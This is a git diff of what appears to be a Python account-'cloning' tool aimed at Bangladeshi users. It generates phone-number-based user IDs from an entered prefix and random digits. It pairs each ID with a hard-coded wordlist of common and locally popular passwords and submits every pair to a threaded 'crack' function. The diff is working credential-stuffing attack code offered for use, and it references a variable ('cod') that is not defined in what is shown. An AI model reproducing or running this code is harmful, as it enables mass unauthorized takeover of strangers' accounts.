@@ -11450,6 +11450,7 @@ def Rdx3x():
 	jalan('\x1b[1;92m  BD CODES    :  \x1b[1;92m88016, \x1b[1;92m88017 ,\x1b[1;92m88018 ,\x1b[1;92m88019  ...\033[0;97m')
 	jalan('\x1b[1;97m ══════════════════════════════════════════════════════════\n')
 	code = input(' PUT CODE : ')
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
 	os.system('clear')
 	print(logo1)
 	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
@@ -11481,12 +11482,9 @@ def Rdx3x():
 		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME      \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
 		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
 		print ('')
-		for noob in user:
-			pwx = [noob[1:]]
-			uid = code+noob
-			for pro in RdxID:
-				pwx.append(pro)
-				pwx.append(noob)
+		for co in user:
+			uid = code+codex+cod+co
+			pwx = [code,codex,code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
 			manshera.submit(rcrackx,uid,pwx,tl)
 	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
 	print('\x1b[1;94mCrack process has been completed')
